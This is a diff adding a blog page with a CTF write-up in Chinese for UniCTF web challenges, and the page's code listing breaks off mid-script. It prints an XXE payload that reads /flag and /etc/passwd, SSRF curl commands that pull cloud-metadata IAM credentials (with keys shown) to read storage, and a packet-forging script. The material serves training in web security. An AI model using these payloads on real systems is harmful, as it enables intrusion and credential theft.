@@ -1,0 +1,1054 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Huaji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Huaji">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="搞到现在总算有个博客了">
+    <meta name="description" content="UniCTF web单方向wp才发现哥几个都是懒勾，写脚本不写注释，下回得好好学学怎么写wp. Websecure docai直出 解题思路（核心漏洞）  该站点只解析 XFA 表单（XML），&#x2F;upload 接收 PDF，&#x2F;download&#x2F;.txt 回显解析文本 XFA XML 解析未禁用外部实体 → XXE 文件读取 通过在 XFA 中构造 &lt;!ENTIT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UniCTF web单方向wp">
+<meta property="og:url" content="http://huajihd.github.io/2026/02/03/2026UniCTF-web/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="UniCTF web单方向wp才发现哥几个都是懒勾，写脚本不写注释，下回得好好学学怎么写wp. Websecure docai直出 解题思路（核心漏洞）  该站点只解析 XFA 表单（XML），&#x2F;upload 接收 PDF，&#x2F;download&#x2F;.txt 回显解析文本 XFA XML 解析未禁用外部实体 → XXE 文件读取 通过在 XFA 中构造 &lt;!ENTIT">
+<meta property="og:locale">
+<meta property="article:published_time" content="2026-02-03T07:17:43.000Z">
+<meta property="article:modified_time" content="2026-02-03T07:22:54.591Z">
+<meta property="article:author" content="Huaji">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>UniCTF web单方向wp · Huajiの小窝</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">Huajiの小窝.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">Huajiの小窝.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">UniCTF web单方向wp</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                UniCTF web单方向wp
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2026/02/03</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="UniCTF-web单方向wp"><a href="#UniCTF-web单方向wp" class="headerlink" title="UniCTF web单方向wp"></a>UniCTF web单方向wp</h1><p>才发现哥几个都是懒勾，写脚本不写注释，下回得好好学学怎么写wp.</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="secure-doc"><a href="#secure-doc" class="headerlink" title="secure doc"></a>secure doc</h3><p>ai直出</p>
+<p>解题思路（核心漏洞）</p>
+<ul>
+<li>该站点只解析 XFA 表单（XML），&#x2F;upload 接收 PDF，&#x2F;download&#x2F;<id>.txt 回显解析文本</li>
+<li>XFA XML 解析未禁用外部实体 → XXE 文件读取</li>
+<li>通过在 XFA 中构造 <code>&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</code>，即可回显 &#x2F;flag 内容</li>
+</ul>
+<p>Burp Suite + MCP 操作步骤（建议截图点）</p>
+<ol>
+<li>抓包上传请求<ul>
+<li>打开页面上传 PDF，Burp 抓到 POST &#x2F;upload 的 multipart&#x2F;form-data 请求</li>
+<li>截图要点：请求体包含 file 字段（PDF 二进制）</li>
+</ul>
+</li>
+<li>用 MCP 串联两步请求<ul>
+<li>Step 1：POST &#x2F;upload（携带恶意 XFA PDF）</li>
+<li>Step 2：GET &#x2F;download&#x2F;.txt</li>
+<li>用正则从 Step1 响应 JSON 中提取 file_id：<ul>
+<li>正则示例：”file_id”:”([^”]+)”</li>
+</ul>
+</li>
+<li>截图要点：MCP 变量提取 + Step2 URL 使用变量</li>
+</ul>
+</li>
+<li>验证与取旗<ul>
+<li>先读 &#x2F;etc&#x2F;passwd 验证 XXE 可用</li>
+<li>再读 &#x2F;flag，返回即为 flag</li>
+<li>截图要点：&#x2F;download&#x2F;… 响应中出现 flag</li>
+</ul>
+</li>
+</ol>
+<p>关键 XFA XXE 负载（嵌入 PDF 的 XML）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdp [ &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt;</span><br><span class="line">&lt;xdp:xdp xmlns:xdp=&quot;[http://ns.adobe.com/xdp/](http://ns.adobe.com/xdp/)&quot;&gt;</span><br><span class="line">&lt;xfa:datasets xmlns:xfa=&quot;[http://www.xfa.org/schema/xfa-data/1.0/](http://www.xfa.org/schema/xfa-data/1.0/)&quot;&gt;</span><br><span class="line">xfa:data&amp;xxe;&lt;/xfa:data&gt;</span><br><span class="line">&lt;/xfa:datasets&gt;</span><br><span class="line">&lt;/xdp:xdp&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="cloudDiag"><a href="#cloudDiag" class="headerlink" title="cloudDiag"></a><strong>cloudDiag</strong></h3><p>解题思路</p>
+<ul>
+<li>入口在 &#x2F;tasks&#x2F;new 的 config_url，服务端会抓取并回显前 2KB，典型 SSRF。</li>
+<li>页脚提示 “instance roles”，说明有云实例角色可取；过滤器要求元数据走 metadata 主机且端口 1338。</li>
+<li>通过 <a target="_blank" rel="noopener" href="http://metadata:1338/latest/meta-data/iam/security-credentials/">http://metadata:1338/latest/meta-data/iam/security-credentials/</a> 拿到角色名，再取临时凭证。</li>
+<li>用凭证在 &#x2F;explorer 列桶与对象，clouddiag-secrets 中直接有 flag 文件。</li>
+</ul>
+<p>关键步骤（Burp MCP 思路）</p>
+<ul>
+<li><p>MCP 命令1：POST &#x2F;tasks&#x2F;new，config_url 指向 <a target="_blank" rel="noopener" href="http://metadata:1338/latest/meta-data/iam/security-credentials/">http://metadata:1338/latest/meta-data/iam/security-credentials/</a>，从响应</p>
+<p><code>提取角色名。</code></p>
+</li>
+<li><p>MCP 命令2：POST &#x2F;tasks&#x2F;new，config_url 指向 <a target="_blank" rel="noopener" href="http://metadata:1338/latest/meta-data/iam/security-credentials/">http://metadata:1338/latest/meta-data/iam/security-credentials/</a><ROLE>，<br>提取 AccessKeyId&#x2F;SecretAccessKey&#x2F;Token。</p>
+</li>
+<li><p>MCP 命令3：POST &#x2F;explorer 带上三元组，先列桶，再指定对象键读取内容。</p>
+</li>
+<li><p>若 MCP 不便自动提取，可手动复制值填入下一步（流程不变）。</p>
+</li>
+</ul>
+<p>命令示例（等效于 Burp 请求）</p>
+<p><strong>1) 取角色名</strong></p>
+<p>curl -s -b &#x2F;tmp&#x2F;cdiag_cookies.txt -d <br>  ‘config_url&#x3D;<a target="_blank" rel="noopener" href="http://metadata:1338/latest/meta-data/iam/security-credentials/&name=meta&parse_mode=auto">http://metadata:1338/latest/meta-data/iam/security-credentials/&amp;name=meta&amp;parse_mode&#x3D;auto</a>‘ <br>  <a target="_blank" rel="noopener" href="http://80-fb22f27b-435c-4337-87d8-478334f66622.challenge.ctfplus.cn/tasks/new">http://80-fb22f27b-435c-4337-87d8-478334f66622.challenge.ctfplus.cn/tasks/new</a></p>
+<p><strong>2) 取临时凭证（本次实测角色名）</strong></p>
+<p>curl -s -b &#x2F;tmp&#x2F;cdiag_cookies.txt -d <br>  ‘config_url&#x3D;<a target="_blank" rel="noopener" href="http://metadata:1338/latest/meta-data/iam/security-credentials/clouddiag-instance-">http://metadata:1338/latest/meta-data/iam/security-credentials/clouddiag-instance-</a><br>  role&amp;name&#x3D;creds&amp;parse_mode&#x3D;auto’ <br>  <a target="_blank" rel="noopener" href="http://80-fb22f27b-435c-4337-87d8-478334f66622.challenge.ctfplus.cn/tasks/new">http://80-fb22f27b-435c-4337-87d8-478334f66622.challenge.ctfplus.cn/tasks/new</a></p>
+<p><strong>3) 列桶</strong></p>
+<p>curl -s -b &#x2F;tmp&#x2F;cdiag_cookies.txt -d <br>  ‘access_key&#x3D;AKIA002F193518034D3C&amp;secret_key&#x3D;d32907b3282e4e26924ce7f72dc021347d974d2fe78e4c7691e444efc208c031&amp;session_t<br>  oken&#x3D;06bdedd4d10b4687a5dfa7afceba34d691307c4202ad463597c0ec7c175d810a’ <br>  <a target="_blank" rel="noopener" href="http://80-fb22f27b-435c-4337-87d8-478334f66622.challenge.ctfplus.cn/explorer">http://80-fb22f27b-435c-4337-87d8-478334f66622.challenge.ctfplus.cn/explorer</a></p>
+<p><strong>4) 取对象</strong></p>
+<p>curl -s -b &#x2F;tmp&#x2F;cdiag_cookies.txt -d <br>  ‘access_key&#x3D;AKIA002F193518034D3C&amp;secret_key&#x3D;d32907b3282e4e26924ce7f72dc021347d974d2fe78e4c7691e444efc208c031&amp;session_t<br>  oken&#x3D;06bdedd4d10b4687a5dfa7afceba34d691307c4202ad463597c0ec7c175d810a&amp;bucket&#x3D;clouddiag-secrets&amp;object_key&#x3D;flags&#x2F;<br>  runtime&#x2F;flag-0892b8c18d2546ada5362748a4e70fe4.txt’ <br>  <a target="_blank" rel="noopener" href="http://80-fb22f27b-435c-4337-87d8-478334f66622.challenge.ctfplus.cn/explorer">http://80-fb22f27b-435c-4337-87d8-478334f66622.challenge.ctfplus.cn/explorer</a></p>
+<p>Flag</p>
+<p>UniCTF{2db72669-88bf-4359-b5fe-ad13810f7f50}</p>
+<h3 id="Bytecode-Complier"><a href="#Bytecode-Complier" class="headerlink" title="Bytecode Complier"></a><strong>Bytecode Complier</strong></h3><p>解题思路</p>
+<ul>
+<li>首页提示 &#x2F;api&#x2F;fetch?url&#x3D;…&amp;token&#x3D;…，并且 UI 只暴露 ECHO&#x2F;LEN&#x2F;HASH；真正的突破点在客户端协议实现 &#x2F;bundle.js。</li>
+<li>bundle.js 里给出了完整 packet 格式、opCode 编码和 FNV 校验。分发表有 4 个槽位（含内部诊断槽），而 flags 最高位为 1 时会走“兼<br>容分发”逻辑。</li>
+<li>选用 opId&#x3D;0（ECHO）但设置 flags&#x3D;0x83（最高位为 1 + 低两位为 3），即可把分发索引打到内部诊断槽，直接拿到 token。</li>
+<li>用 token 调 &#x2F;api&#x2F;fetch 后端去抓 &#x2F;internal&#x2F;flag，拿到 flag。</li>
+</ul>
+<p>Burp 操作步骤（不依赖“未知 MCP”，用官方机制&#x2F;最佳实践）</p>
+<ul>
+<li>说明：我没在 Burp 官方文档里找到名为 MCP 的功能。Burp 里“多步请求&#x2F;自动化”的官方能力通常是 Session handling rules +<br>Macros（可在 Settings &gt; Sessions 中配置）来在发送请求前自动执行一串请求并更新参数&#x2F;会话。(portswigger.net (https:&#x2F;&#x2F;<br>portswigger.net&#x2F;burp&#x2F;documentation&#x2F;desktop&#x2F;settings&#x2F;sessions?utm_source&#x3D;openai))</li>
+</ul>
+<ol>
+<li>代理接入：浏览器走 Burp 代理，访问目标首页；在 Proxy history 里找到 &#x2F;bundle.js，Send to Repeater。</li>
+<li>协议复现：从 &#x2F;bundle.js 提取 packet 格式与编码逻辑（WVLT 头、nonce、opCode 编码、FNV1a 校验）。</li>
+<li>构造隐藏指令：用脚本生成一个 packet（opId&#x3D;0, flags&#x3D;0x83），在 Repeater 中 POST &#x2F;api&#x2F;vm：<ul>
+<li>Content-Type: application&#x2F;json</li>
+<li>Body：{“packet_b64”:”&lt;生成的base64&gt;”}</li>
+<li>返回里会给 token。</li>
+</ul>
+</li>
+<li>后端拉取 flag：用 Repeater GET：<ul>
+<li>&#x2F;api&#x2F;fetch?url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/internal/flag&token=">http://127.0.0.1/internal/flag&amp;token=</a><token></li>
+<li>返回 body 即 flag。</li>
+</ul>
+</li>
+</ol>
+<p>命令示例（可直接生成 packet，配合 Burp 或 curl）</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node gen.js</span></span><br><span class="line">  <span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> K = [<span class="number">0x1c</span>,<span class="number">0x2d</span>,<span class="number">0x3e</span>,<span class="number">0x40</span>,<span class="number">0xa5</span>,<span class="number">0xb6</span>,<span class="number">0xc7</span>,<span class="number">0xd8</span>,<span class="number">0x24</span>,<span class="number">0x68</span>,<span class="number">0xac</span>,<span class="number">0xe0</span>];</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">K1</span> = ((K[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(K[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(K[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|K[<span class="number">3</span>])&gt;&gt;&gt;<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">K2</span> = ((K[<span class="number">4</span>]&lt;&lt;<span class="number">24</span>)|(K[<span class="number">5</span>]&lt;&lt;<span class="number">16</span>)|(K[<span class="number">6</span>]&lt;&lt;<span class="number">8</span>)|K[<span class="number">7</span>])&gt;&gt;&gt;<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">K3</span> = ((K[<span class="number">8</span>]&lt;&lt;<span class="number">24</span>)|(K[<span class="number">9</span>]&lt;&lt;<span class="number">16</span>)|(K[<span class="number">10</span>]&lt;&lt;<span class="number">8</span>)|K[<span class="number">11</span>])&gt;&gt;&gt;<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">ROT</span> = <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">rotl32</span> = (<span class="params">v,s</span>)=&gt;((v&lt;&lt;s)|(v&gt;&gt;&gt;(<span class="number">32</span>-s)))&gt;&gt;&gt;<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">encodeOp</span> = (<span class="params">opId, nonceLow32</span>)=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> rot = (<span class="title function_">rotl32</span>((nonceLow32 ^ <span class="variable constant_">K2</span>)&gt;&gt;&gt;<span class="number">0</span>, <span class="variable constant_">ROT</span>) &amp; <span class="number">0xfffffffc</span>)&gt;&gt;&gt;<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> base = ((opId ^ <span class="variable constant_">K1</span>) + rot)&gt;&gt;&gt;<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ((base ^ <span class="variable constant_">K3</span>) | <span class="number">0x80000000</span>)&gt;&gt;&gt;<span class="number">0</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">fnv1a32</span> = (<span class="params">bytes</span>)=&gt;&#123;</span><br><span class="line">    <span class="keyword">let</span> h = <span class="number">0x811c9dc5</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> b <span class="keyword">of</span> bytes)&#123; h ^= b; h = (h * <span class="number">0x01000193</span>)&gt;&gt;&gt;<span class="number">0</span>; &#125; <span class="comment">// JS精度行为</span></span><br><span class="line">    <span class="keyword">return</span> h&gt;&gt;&gt;<span class="number">0</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">u32le</span> = v=&gt;[v&amp;<span class="number">0xff</span>,(v&gt;&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>,(v&gt;&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>,(v&gt;&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>];</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">u16le</span> = v=&gt;[v&amp;<span class="number">0xff</span>,(v&gt;&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">buildPacket</span>(<span class="params">ops, flags=<span class="number">0x83</span></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> enc = <span class="keyword">new</span> <span class="title class_">TextEncoder</span>();</span><br><span class="line">    <span class="keyword">const</span> nonce = crypto.<span class="title function_">randomBytes</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">const</span> nonceLow32 = <span class="keyword">new</span> <span class="title class_">DataView</span>(nonce.<span class="property">buffer</span>, nonce.<span class="property">byteOffset</span>, nonce.<span class="property">byteLength</span>).<span class="title function_">getUint32</span>(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> chunks = [];</span><br><span class="line">    chunks.<span class="title function_">push</span>(...enc.<span class="title function_">encode</span>(<span class="string">&#x27;WVLT&#x27;</span>));</span><br><span class="line">    chunks.<span class="title function_">push</span>(<span class="number">0x01</span>);</span><br><span class="line">    chunks.<span class="title function_">push</span>(...nonce);</span><br><span class="line">    chunks.<span class="title function_">push</span>(ops.<span class="property">length</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> [opId, arg] <span class="keyword">of</span> ops)&#123;</span><br><span class="line">      <span class="keyword">const</span> argBytes = enc.<span class="title function_">encode</span>(arg);</span><br><span class="line">      <span class="keyword">const</span> opCode = <span class="title 